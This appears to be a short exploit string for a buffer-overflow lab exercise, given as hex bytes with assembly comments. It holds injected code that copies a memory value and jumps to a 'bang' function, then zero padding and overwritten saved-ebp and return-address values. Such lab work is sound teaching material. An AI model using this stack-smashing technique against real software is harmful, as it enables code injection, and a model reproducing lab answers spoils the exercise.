A1 14 D2 04 08 /* mov 0x0804D214, %eax */
A3 00 D2 04 08 /* mov %eax, 0x0804D200 */
55 			   /* push %ebp */
C3 			   /* ret */

00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00

DD 8C 04 08    /* previous ebp set to bang function */
EC 38 68 55    /* return address set to beginning of this buffer */
